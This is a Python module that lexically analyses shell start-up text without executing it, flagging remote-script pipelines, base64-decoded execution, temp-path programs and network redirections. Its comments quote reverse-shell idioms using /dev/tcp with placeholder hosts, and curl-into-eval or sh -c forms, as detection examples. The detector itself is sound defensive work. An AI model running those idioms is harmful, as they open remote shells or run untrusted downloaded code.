"""Bounded shell-like lexical triage; never a Bash interpreter or full AST.

A small lexer keeps what matters for deciding *what runs*: quoting, comments,
line continuations, command/process substitution bodies, redirections and
here-documents. On top of it a simple-command reader recognises literal
executable and script operands, a fixed set of transparent wrappers, and
connected pipelines whose downstream stage reads code from stdin.

Anything that could change which program or script runs and is not resolved
statically (an expanded command word or script operand, inline interpreter
code, unterminated quoting) is reported as a limitation, never as clean and
never as a guessed finding. No input is executed, expanded, sourced, decoded
or sent to a subprocess.
"""
from __future__ import annotations

import re
from dataclasses import dataclass, field
from pathlib import PurePosixPath

TEMP_PREFIXES = ("/tmp/", "/var/tmp/", "/dev/shm/")
SHELLS = {"sh", "bash", "dash", "zsh", "ksh", "mksh", "busybox"}
# Interpreter -> option that introduces inline code.
INTERPRETERS = {"perl": "-e", "ruby": "-e", "node": "-e", "nodejs": "-e", "php": "-r", "lua": "-e"}
DATA_BUILTINS = {"echo", "printf", "true", "false", ":", "test", "[", "[[", "read", "cd", "pwd", "return",
                 "exit", "shift", "set", "unset", "shopt", "umask", "complete", "bind", "hash", "type"}
KEYWORDS_DATA = {"case", "for", "select", "function", "in"}
KEYWORDS_END = {"fi", "done", "esac", "}"}
TRANSPARENT = {"then", "do", "else", "elif", "if", "while", "until", "!", "{", "command", "builtin",
               "nohup", "setsid", "exec", "time"}
# Reserved words are transparent only as bare, unquoted words: "/tmp/if" and 'if' are programs called "if".
RESERVED_TRANSPARENT = {"then", "do", "else", "elif", "if", "while", "until", "!", "{"}
ASSIGN_BUILTINS = {"export", "declare", "local", "readonly", "typeset"}
REDIRECTS = {"<", ">", ">>", "<&", ">&", "<>", "&>", "&>>", ">|", "<<<"}
SEPARATORS = {";", "&", "&&", "||", ";;", ";&", ";;&", "(", ")", "\n"}
OPERATORS = sorted(["<<<", "<<-", "&>>", ";;&", "&&", "||", ";;", ";&", "<<", ">>", "<&", ">&", "<>", "&>", ">|", "|&",
                    ";", "&", "|", "(", ")", "<", ">"], key=len, reverse=True)
MAX_INPUT = 131_072
MAX_DEPTH = 4
MAX_TOKENS = 8192

# Closed vocabularies. `analyze` emits nothing outside these two sets; a
# property test enforces it on arbitrary input.
PATTERN_CODES = frozenset({
    "TEMP_PATH_IN_EXECUTION", "REMOTE_SCRIPT_PIPELINE",
    "BASE64_DECODE_EXECUTION_CONTEXT", "RISKY_EXECUTION_FLAG",
    "NETWORK_REDIRECTION",
})
NETWORK_DEVICE_PREFIXES = ("/dev/tcp/", "/dev/udp/")
LIMITATION_CODES = frozenset({
    "TOKEN_LIMIT", "UNTERMINATED_HEREDOC", "UNPARSED_QUOTING", "EXPANSION_NOT_RESOLVED",
    "INLINE_INTERPRETER_CODE_NOT_ANALYZED", "MISSING_SHELL_COMMAND_OPERAND",
    "HEREDOC_EXPANSION_NOT_RESOLVED", "NESTING_LIMIT", "INPUT_LIMIT",
    "INCOMPLETE_CONTINUATION", "NUL_IN_INPUT",
})


def _temporary(value: str) -> bool:
    # Normalize dot segments lexically, without following any filesystem link.
    parts: list[str] = []
    if not value.startswith("/"):
        return False
    for part in value.split("/"):
        if part == "..":
            if parts:
                parts.pop()
        elif part not in ("", "."):
            parts.append(part)
    return ("/" + "/".join(parts)).startswith(TEMP_PREFIXES)


@dataclass
class Word:
    text: str
    line: int
    expands: bool = False          # contains an unresolved $ / ` expansion
    quoted: bool = False
    subs: list[str] = field(default_factory=list)  # command-substitution bodies


@dataclass
class Op:
    op: str
    line: int
    body: str | None = None        # process substitution or here-document body
    quoted_delimiter: bool = False  # no mutate: read only on here-document operators, which always set it


class _Unterminated(Exception):
    pass


def _balanced(text: str, i: int, opener: str = "(", closer: str = ")") -> int:
    """Index just past the closer matching text[i-1] == opener; quote-aware."""
    depth, n = 1, len(text)
    while i < n:
        c = text[i]
        if c == "\\":
            i += 2
            continue
        if c == "'":
            j = text.find("'", i + 1)
            if j < 0:  # no mutate: find() from i + 1 >= 1 returns -1 or >= 1
                raise _Unterminated
            i = j + 1
            continue
        if c == '"':
            i = _double_quote_end(text, i + 1)
            continue
        if c == opener:
            depth += 1
        elif c == closer:
            depth -= 1
            if depth == 0:
                return i + 1
        i += 1
    raise _Unterminated


def _double_quote_end(text: str, i: int) -> int:
    n = len(text)
    while i < n:
        c = text[i]
        if c == "\\":
            i += 2
            continue
        if c == '"':
            return i + 1
        if c == "$" and text.startswith("$(", i):
            i = _balanced(text, i + 2)
            continue
        if c == "$" and text.startswith("${", i):
            # Quotes nest inside a brace expansion: "${x#"y"}" is one word (P-11).
            i = _balanced(text, i + 2, "{", "}")
            continue
        if c == "`":
            j = _backtick_end(text, i + 1)
            i = j
            continue
        i += 1
    raise _Unterminated


def _backtick_end(text: str, i: int) -> int:
    n = len(text)
    while i < n:
        if text[i] == "\\":
            i += 2
            continue
        if text[i] == "`":
            return i + 1
        i += 1
    raise _Unterminated


def _dollar(text: str, i: int, word: Word) -> int:
    """Consume an expansion starting at text[i] == '$'. Returns next index.

    Variables become a marker that keeps the name (\x00VAR:NAME\x00) so a
    caller may resolve well-known ones such as HOME; nothing is evaluated.
    """
    nxt = text[i + 1] if i + 1 < len(text) else ""
    if text.startswith("$((", i):
        word.expands = True
        word.text += "\x00ARITH\x00"
        return _balanced(text, i + 2)
    if nxt == "(":
        end = _balanced(text, i + 2)
        word.expands = True
        word.subs.append(text[i + 2:end - 1])
        word.text += "\x00SUB\x00"
        return end
    if nxt == "{":
        end = _balanced(text, i + 2, "{", "}")
        inner = text[i + 2:end - 1]
        word.expands = True
        word.text += "\x00VAR:%s\x00" % (inner if re.fullmatch(r"[A-Za-z_][A-Za-z_0-9]*", inner) else "?")
        return end
    if nxt == "'":
        # ANSI-C quoting is a literal string for our purposes, not an expansion.
        j = i + 2
        while j < len(text) and text[j] != "'":
            j += 2 if text[j] == "\\" else 1
        if j >= len(text):
            raise _Unterminated
        word.text += text[i + 2:j]
        word.quoted = True
        return j + 1
    m = re.match(r"[A-Za-z_][A-Za-z_0-9]*|[0-9@*#?$!-]", text[i + 1:])
    if m:
        word.expands = True
        word.text += "\x00VAR:%s\x00" % m.group(0)
        return i + 1 + m.end()
    word.text += "$"
    return i + 1


def _lex(text: str, gaps: set[str]) -> list[Word | Op]:
    tokens: list[Word | Op] = []
    pending_heredocs: list[Op] = []
    word: Word | None = None
    line, i, n = 1, 0, len(text)

    def flush() -> None:
        nonlocal word
        if word is not None:
            tokens.append(word)
            word = None

    def cur() -> Word:
        nonlocal word
        if word is None:
            word = Word("", line)
        return word

    while i < n:
        if len(tokens) > MAX_TOKENS:
            gaps.add("TOKEN_LIMIT")
            break
        c = text[i]
        if c in " \t":
            flush()
            i += 1
            continue
        if c == "\n":
            flush()
            tokens.append(Op("\n", line))
            line += 1
            i += 1
            for doc in pending_heredocs:
                body: list[str] = []
                while True:
                    if i >= n:
                        gaps.add("UNTERMINATED_HEREDOC")
                        break
                    end = text.find("\n", i)
                    if end < 0:  # no mutate: find() from i >= 1 returns -1 or >= 1
                        end = n
                    raw = text[i:end]
                    i = min(end + 1, n)
                    line += 1
                    check = raw.lstrip("\t") if doc.op == "<<-" else raw
                    if check == doc.body:
                        break
                    body.append(raw)
                doc.body = "\n".join(body)
            pending_heredocs = []
            continue
        if c == "#" and word is None:
            end = text.find("\n", i)
            i = n if end < 0 else end
            continue
        if c == "\\":
            if text.startswith("\\\n", i):
                line += 1
                i += 2
                continue
            if i + 1 < n:
                cur().text += text[i + 1]
                cur().quoted = True
            else:
                # A bare trailing backslash joins a line that is not there.
                # Decided here, in lexer state, so a comment ending in a
                # backslash (skipped above) is not mistaken for a continuation.
                gaps.add("INCOMPLETE_CONTINUATION")
            i += 2
            continue
        try:
            if c == "'":
                j = text.find("'", i + 1)
                if j < 0:
                    raise _Unterminated
                w = cur()
                w.text += text[i + 1:j]
                w.quoted = True
                line += text.count("\n", i, j)
                i = j + 1
                continue
            if c == '"':
                end = _double_quote_end(text, i + 1)
                w = cur()
                w.quoted = True
                inner = text[i + 1:end - 1]
                k = 0
                while k < len(inner):
                    # The quote scan paired every backslash with a successor, so the
                    # slice is never empty here; a slice cannot raise where an index would.
                    if inner[k] == "\\" and inner[k + 1:k + 2] in ("$", "`", '"', "\\", "\n"):
                        w.text += inner[k + 1]
                        k += 2
                    elif inner[k] == "$":
                        k = _dollar(inner, k, w)
                    elif inner[k] == "`":
                        j = _backtick_end(inner, k + 1)
                        w.subs.append(inner[k + 1:j - 1])
                        w.expands = True
                        w.text += "\x00SUB\x00"
                        k = j
                    else:
                        w.text += inner[k]
                        k += 1
                line += text.count("\n", i, end)
                i = end
                continue
            if c == "$":
                start = i
                i = _dollar(text, i, cur())
                line += text.count("\n", start, i)
                continue
            if c == "`":
                j = _backtick_end(text, i + 1)
                w = cur()
                w.subs.append(text[i + 1:j - 1])
                w.expands = True
                w.text += "\x00SUB\x00"
                line += text.count("\n", i, j)
                i = j
                continue
        except _Unterminated:
            gaps.add("UNPARSED_QUOTING")
            flush()
            return tokens
        op = next((o for o in OPERATORS if text.startswith(o, i)), None)
        if op is None:
            cur().text += c
            i += 1
            continue
        if op in ("<", ">") and text.startswith("(", i + 1):
            try:
                end = _balanced(text, i + 2)
            except _Unterminated:
                gaps.add("UNPARSED_QUOTING")
                flush()
                return tokens
            flush()
            tokens.append(Op("procsub" + op, line, text[i + 2:end - 1]))
            line += text.count("\n", i, end)
            i = end
            continue
        # "2>/dev/null": a bare unquoted number right before a redirection is an fd.
        if word is not None and word.text.isdigit() and not word.quoted and (op in REDIRECTS or op in ("<<", "<<-")):
            word = None
        flush()
        i += len(op)
        if op in ("<<", "<<-"):
            while i < n and text[i] in " \t":
                i += 1
            m = re.match(r"(['\"]?)(\\?)([^\s;&|<>()'\"\\]+)\1", text[i:])
            if not m:
                gaps.add("UNPARSED_QUOTING")
                return tokens
            doc = Op(op, line, m.group(3), quoted_delimiter=bool(m.group(1) or m.group(2)))
            tokens.append(doc)
            pending_heredocs.append(doc)
            i += m.end()
            continue
        tokens.append(Op(op, line))
    flush()
    if pending_heredocs:
        gaps.add("UNTERMINATED_HEREDOC")
        for doc in pending_heredocs:
            doc.body = ""
    return tokens


@dataclass
class Command:
    words: list[Word] = field(default_factory=list)
    redirects: list[tuple[str, Word | Op]] = field(default_factory=list)
    heredocs: list[Op] = field(default_factory=list)
    procsubs: list[Op] = field(default_factory=list)


def _pipelines(tokens: list[Word | Op]) -> list[list[Command]]:
    """Group tokens into pipelines of simple commands."""
    pipelines: list[list[Command]] = []
    current: list[Command] = [Command()]
    expect_target: str | None = None
    # case ... in PATTERN) BODY ;; ... esac — patterns are data, not commands.
    case_stack: list[str] = []
    for tok in tokens:
        cmd = current[-1]
        state = case_stack[-1] if case_stack else None
        if isinstance(tok, Word) and not tok.quoted:
            if tok.text == "case" and not cmd.words:
                case_stack.append("subject")
            elif tok.text == "in" and state == "subject":
                case_stack[-1] = "pattern"
                current = [Command()]
                continue
            elif tok.text == "esac" and state in ("pattern", "body") and not cmd.words:
                case_stack.pop()
                continue
        if state == "pattern":
            if isinstance(tok, Op) and tok.op == ")":
                case_stack[-1] = "body"
                current = [Command()]
            continue
        if state == "body" and isinstance(tok, Op) and tok.op in (";;", ";&", ";;&"):
            pipelines.append(current)
            current = [Command()]
            case_stack[-1] = "pattern"
            continue
        if isinstance(tok, Word):
            if expect_target:
                cmd.redirects.append((expect_target, tok))
                expect_target = None
            else:
                cmd.words.append(tok)
            continue
        if tok.op in REDIRECTS:
            expect_target = tok.op
            continue
        expect_target = None
        if tok.op in ("<<", "<<-"):
            cmd.heredocs.append(tok)
        elif tok.op.startswith("procsub"):
            cmd.procsubs.append(tok)
            cmd.words.append(Word("\x00PROCSUB%d\x00" % (len(cmd.procsubs) - 1), tok.line))
        elif tok.op in ("|", "|&"):
            current.append(Command())
        elif tok.op == "\n" and (not cmd.words and not cmd.redirects and len(current) > 1):
            continue  # "a |\n b": the pipeline continues on the next line
        elif tok.op in SEPARATORS:
            pipelines.append(current)
            current = [Command()]
    pipelines.append(current)
    return [[c for c in p if c.words or c.redirects or c.heredocs] for p in pipelines if any(
        c.words or c.redirects or c.heredocs for c in p)]


def _strip_options(words: list[Word], with_value: set[str]) -> list[Word]:
    while words and words[0].text.startswith("-") and words[0].text != "-":
        option = words.pop(0).text
        if option == "--":
            break
        if option in with_value and words:
            words.pop(0)
    return words


def _head(words: list[Word], analyse_value) -> list[Word]:
    """Remove assignments and a small, documented set of transparent wrappers."""
    words = list(words)
    for _ in range(16):
        if not words:
            return []
        first = words[0]
        name = PurePosixPath(first.text).name
        assign = re.fullmatch(r"([A-Za-z_][A-Za-z_0-9]*)=(.*)", first.text, re.S)
        if assign:
            analyse_value(assign.group(1), assign.group(2), first)
            words = words[1:]
            continue
        if _temporary(first.text):
            break                      # a wrapper that itself lives in a volatile path is the program to report (P-10)
        if name in TRANSPARENT and (name not in RESERVED_TRANSPARENT or (first.text == name and not first.quoted)):
            words = words[1:]
        elif name in ("sudo", "doas"):
            words = _strip_options(words[1:], {"-u", "-g", "-h", "-C", "-p", "-r", "-t", "--user", "--group"})
        elif name == "env":
            words = _strip_options(words[1:], {"-u", "--unset", "-C", "--chdir", "-S"})
        elif name == "nice":
            words = _strip_options(words[1:], {"-n", "--adjustment"})
        elif name == "ionice":
            words = _strip_options(words[1:], {"-c", "-n", "-p", "-P", "-u", "--class", "--classdata"})
        elif name == "stdbuf":
            words = _strip_options(words[1:], {"-i", "-o", "-e"})
        elif name == "timeout":
            words = _strip_options(words[1:], {"-s", "-k", "--signal", "--kill-after"})
            words = words[1:]  # DURATION
        elif name == "xargs":
            words = _strip_options(words[1:], {"-I", "-n", "-P", "-d", "-a", "-E", "-s", "-L", "--arg-file",
                                                "--delimiter", "--max-args", "--max-procs"})
        else:
            break
    return words


class _Analysis:
    def __init__(self, depth: int):
        self.depth = depth
        self.patterns: set[str] = set()
        self.matches: dict[int, set[str]] = {}
        self.gaps: set[str] = set()
        self.sourced: list[str] = []
        self.emits: set[str] = set()   # source classes of commands (for substitutions)
        self._sub_emits: set[str] = set()  # source classes of the current command's own $(...)
        self.evaluated_programs: list[str] = []   # literal heads of $(...) whose output is executed as code
        self.literal_heads: list[str] = []         # literal program words of this run's simple commands
        self.unresolved = 0                        # sites that produced EXPANSION_NOT_RESOLVED
        self._sub_heads: list[str] = []            # literal heads of the current command's own $(...)

    def unresolved_site(self) -> None:
        self.gaps.add("EXPANSION_NOT_RESOLVED")
        self.unresolved += 1

    def found(self, rules: set[str], line: int) -> None:
        if rules:
            self.patterns.update(rules)
            self.matches.setdefault(line, set()).update(rules)

    def nested(self, text: str, line: int) -> "_Analysis":
        sub = _run(text, self.depth + 1)
        self.gaps.update(sub.gaps)
        self.found(sub.patterns, line)
        self.evaluated_programs.extend(sub.evaluated_programs)
        self.unresolved += sub.unresolved
        return sub

    def value(self, name: str, value: str, word: Word) -> None:
        """Assignments whose value is later executed as a command."""
        if name in ("PROMPT_COMMAND", "BASH_ENV", "ENV"):
            if word.expands:
                self.unresolved_site()
            if name == "PROMPT_COMMAND":
                # The value is executed at every prompt: code that arrives in it
                # from a download or a decode is code from that source.
                self._code_from(self._sub_emits, word.line)
                self.nested(value, word.line)
            elif _temporary(value):
                self.found({"TEMP_PATH_IN_EXECUTION"}, word.line)

    def command(self, cmd: Command) -> tuple[str, bool]:
        """Analyse one simple command; return (output source class, reads code from stdin)."""
        sub_emits: set[str] = set()
        sub_heads: list[str] = []
        for w in cmd.words:
            for body in w.subs:
                sub = self.nested(body, w.line)
                sub_emits.update(sub.emits)
                sub_heads.extend(sub.literal_heads)
        self.emits.update(sub_emits)
        self._sub_emits = sub_emits
        self._sub_heads = sub_heads
        # A redirection to /dev/tcp or /dev/udp opens a socket from the shell
        # itself (reverse-shell idiom: `bash -i >& /dev/tcp/H/P 0>&1`,
        # `exec 3<>/dev/tcp/H/P`). Checked before wrappers are stripped, since
        # `exec` leaves no command word behind.
        for _op, target in cmd.redirects:
            if isinstance(target, Word) and target.text.startswith(NETWORK_DEVICE_PREFIXES):
                self.found({"NETWORK_REDIRECTION"}, target.line)
        procsub_emits = []
        for doc in cmd.procsubs:
            sub = self.nested(doc.body or "", doc.line)
            procsub_emits.append(sub.emits)
        words = _head(cmd.words, self.value)
        if not words:
            return "", False
        first = words[0]
        line = cmd.words[0].line
        text = [w.text for w in words]
        name = first.text if first.text == "." else PurePosixPath(first.text).name
        args = words[1:]
        # Only a bare, unquoted word is a reserved word: "/tmp/done" is a program
        # that happens to be called "done" (found by property testing, P-5).
        if not first.quoted and (first.text in KEYWORDS_END or first.text in KEYWORDS_DATA):
            return "", False
        if first.expands:
            # The program that runs is not known statically.
            self.unresolved_site()
            return "", False
        self.literal_heads.append(first.text)
        if _temporary(first.text):
            self.found({"TEMP_PATH_IN_EXECUTION"}, line)
        if name in DATA_BUILTINS:
            return "", False
        if name == "alias":
            for w in args:
                if "=" in w.text:
                    self.nested(w.text.split("=", 1)[1], w.line)
            return "", False
        if name in ASSIGN_BUILTINS:
            for w in args:
                m = re.fullmatch(r"([A-Za-z_][A-Za-z_0-9]*)=(.*)", w.text, re.S)
                if m:
                    self.value(m.group(1), m.group(2), w)
            return "", False
        if name == "trap":
            rest = [w for w in args if not w.text.startswith("-")]
            if rest:
                if rest[0].expands:
                    self.unresolved_site()
                self.nested(rest[0].text, rest[0].line)
            return "", False
        if name in (".", "source"):
            if args:
                target = args[0]
                if target.text.startswith("\x00PROCSUB"):
                    index = int(target.text.strip("\x00").removeprefix("PROCSUB"))
                    self._code_from(procsub_emits[index], line)
                elif _temporary(target.text):
                    self.found({"TEMP_PATH_IN_EXECUTION"}, line)
                else:
                    self.sourced.append(target.text)  # literal, or a $HOME form the collector may resolve
            return "", False
        if name == "eval":
            if any(w.expands for w in args):
                self.unresolved_site()
                # eval "$(prog args)": the code is prog's output. The caller may
                # decide what it trusts about prog; here it is only recorded.
                if sub_heads and not sub_emits:
                    self.evaluated_programs.extend(sub_heads)
            # eval "$(curl ...)": the evaluated string is the download itself.
            self._code_from(sub_emits, line)
            self.nested(" ".join(w.text for w in args), line)
            return "", False
        if name in SHELLS:
            return self._shell(args, cmd, procsub_emits, line)
        if re.fullmatch(r"python(?:\d+(?:\.\d+)?)?", name) or name in INTERPRETERS:
            inline = "-c" if name.startswith("python") else INTERPRETERS[name]
            options = [w.text for w in args if w.text.startswith("-") and w.text != "-"]
            if any(o == inline or o == "--eval" or (not o.startswith("--") and inline[1] in o[1:]) for o in options):
                self.gaps.add("INLINE_INTERPRETER_CODE_NOT_ANALYZED")
                self._code_from(sub_emits, line)  # python3 -c "$(curl ...)"
                return "", False
            if "-m" in options:
                return "", False
            return "", self._script_operand(args, procsub_emits, line, cmd)
        if name.lower() in {"powershell", "pwsh"} and any(t.lower() == "-encodedcommand" for t in text[1:]):
            self.found({"RISKY_EXECUTION_FLAG"}, line)
        if "--disable-web-security" in text[1:]:
            self.found({"RISKY_EXECUTION_FLAG"}, line)
        source = ""
        if name in {"curl", "wget"}:
            source = "remote"
        elif name == "base64" and any(t in {"-d", "--decode"} for t in text[1:]):
            source = "decoded"
        if source:
            self.emits.add(source)
        return source, False

    def _code_from(self, emits: set[str], line: int) -> None:
        if "remote" in emits:
            self.found({"REMOTE_SCRIPT_PIPELINE"}, line)
        if "decoded" in emits:
            self.found({"BASE64_DECODE_EXECUTION_CONTEXT"}, line)

    def _script_operand(self, args: list[Word], procsub_emits: list[set[str]], line: int, cmd: Command) -> bool:
        """Classify the script operand; True if code is read from stdin."""
        operands = [w for w in args if not w.text.startswith("-") or w.text == "-"]
        if not operands or operands[0].text == "-":
            self._stdin_code(cmd, line)
            return True
        script = operands[0]
        if script.text.startswith("\x00PROCSUB"):
            index = int(script.text.strip("\x00").removeprefix("PROCSUB"))
            self._code_from(procsub_emits[index], line)
        elif _temporary(script.text):
            self.found({"TEMP_PATH_IN_EXECUTION"}, line)
        elif script.expands:
            self.unresolved_site()
        return False

    def _stdin_code(self, cmd: Command, line: int) -> None:
        """Code arrives on stdin: inspect redirections and here-documents."""
        for op, target in cmd.redirects:
            if op == "<" and isinstance(target, Word):
                if _temporary(target.text):
                    self.found({"TEMP_PATH_IN_EXECUTION"}, line)
                elif target.expands:
                    self.unresolved_site()
            elif op == "<<<" and isinstance(target, Word):
                self.nested(target.text, line)
        for doc in cmd.heredocs:
            if not doc.quoted_delimiter and "$" in (doc.body or ""):
                self.gaps.add("HEREDOC_EXPANSION_NOT_RESOLVED")
            self.nested(doc.body or "", line)

    def _shell(self, args: list[Word], cmd: Command, procsub_emits: list[set[str]], line: int) -> tuple[str, bool]:
        options = []
        rest = list(args)
        while rest and rest[0].text.startswith("-") and rest[0].text not in ("-", "--"):
            options.append(rest.pop(0).text)
        if any(o == "-c" or (not o.startswith("--") and "c" in o[1:]) for o in options):
            if not rest:
                self.gaps.add("MISSING_SHELL_COMMAND_OPERAND")
                return "", False
            if rest[0].expands:
                self.unresolved_site()
                self._code_from(self._sub_emits, line)  # sh -c "$(curl ...)"
            self.nested(rest[0].text, line)
            return "", False
        if any(o == "-s" or (not o.startswith("--") and "s" in o[1:]) for o in options):
            self._stdin_code(cmd, line)
            return "", True
        return "", self._script_operand(rest, procsub_emits, line, cmd)


def _run(text: str, depth: int) -> _Analysis:
    result = _Analysis(depth)
    if depth > MAX_DEPTH:
        result.gaps.add("NESTING_LIMIT")
        return result
    if len(text) > MAX_INPUT:
        text = text[:MAX_INPUT]
        result.gaps.add("INPUT_LIMIT")
    tokens = _lex(text, result.gaps)
    if tokens and isinstance(tokens[-1], Op) and tokens[-1].op in ("|", "&&", "||"):
        result.gaps.add("INCOMPLETE_CONTINUATION")
    for pipeline in _pipelines(tokens):
        sources: set[str] = set()
        for cmd in pipeline:
            source, stdin_code = result.command(cmd)
            if stdin_code and cmd.words:
                result._code_from(sources, cmd.words[0].line)
            if source:
                sources.add(source)
    return result


def analyze(text: str, depth: int = 0) -> dict:
    """Deterministic private-content-free findings with exact start-line hints.

    A match means visible syntax, not actual execution or malicious intent.
    Lines are hints for local inspection; no source content is emitted.
    `sourced` lists literal operands of source/. for the caller to resolve.
    """
    nul_seen = "\x00" in text
    if nul_seen:
        # NUL is the analyser's private marker byte (\x00SUB\x00, \x00PROCSUBn\x00,
        # \x00VAR:NAME\x00). Input must never be able to forge a marker: a
        # crafted start-up file could otherwise crash the analyser and turn the
        # whole persistence check into FAILED. Bash itself drops NUL bytes.
        # Stripped here, at the public entry only: nested runs (eval, -c,
        # PROMPT_COMMAND) legitimately carry markers produced by the lexer.
        text = text.replace("\x00", "")
    result = _run(text, depth)
    if nul_seen:
        result.gaps.add("NUL_IN_INPUT")
    return {"patterns": sorted(result.patterns),
            "matches": [{"line": line, "patterns": sorted(rules)} for line, rules in sorted(result.matches.items())],
            "limitations": sorted(result.gaps),
            "sourced": result.sourced,
            "evaluated_programs": result.evaluated_programs,
            "unresolved_expansions": result.unresolved}
